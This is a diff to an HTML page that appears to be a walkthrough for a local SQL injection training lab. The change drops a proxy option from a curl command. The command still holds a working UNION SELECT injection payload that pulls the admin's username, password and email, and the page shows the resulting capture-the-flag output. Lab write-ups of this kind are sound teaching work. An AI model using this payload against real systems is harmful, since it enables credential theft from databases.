@@ -121,7 +121,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab1" \<br> --data-urlencode "id=' UNION SELECT username, password, email FROM users WHERE username='admin' -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab1" \<br> --data-urlencode "id=' UNION SELECT username, password, email FROM users WHERE username='admin' -- -"<br><br>
         <span class="prompt"># Verified output:</span><br>
         <strong>Username:</strong> admin &nbsp;&bull;&nbsp; <strong>Password:</strong> FLAG{ms_un10n_b4s1c_str1ng} &nbsp;&bull;&nbsp; <strong>Email:</strong> admin@sqli-arena.local
     </div>
